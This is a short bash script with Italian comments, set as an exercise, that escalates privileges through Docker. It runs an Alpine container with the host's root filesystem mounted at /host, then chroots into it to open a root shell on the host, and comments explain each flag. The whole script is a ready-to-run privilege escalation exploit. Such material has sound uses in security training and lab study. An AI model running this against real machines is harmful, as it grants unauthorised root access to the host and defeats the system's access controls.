#!/bin/bash

# ==============================================================================
# ESERCIZIO:
# Usa docker per effettuare un privilege escalation
# ==============================================================================

# ==============================================================================
# PRIVILEGE ESCALATION TRAMITE DOCKER
# ==============================================================================

# Definiamo l'immagine da usare (alpine o debian sono le più comuni e leggere)
IMAGE="alpine"

echo "[+] Avvio del container per ottenere una shell di root sull'host..."

# Spiegazione dei parametri usati:
# - run       : crea e avvia un nuovo container
# - --rm      : distrugge il container una volta terminata la sessione
# - -it       : apre un terminale interattivo (TTY)
# - -v /:/host: monta la cartella radice dell'host (/) dentro la cartella /host del container
# - alpine    : scarica/usa l'immagine leggera di Alpine Linux
# - chroot /host /bin/bash : cambia la cartella radice del processo in /host ed esegue una shell
docker run --rm -it -v /:/host "$IMAGE" chroot /host /bin/bash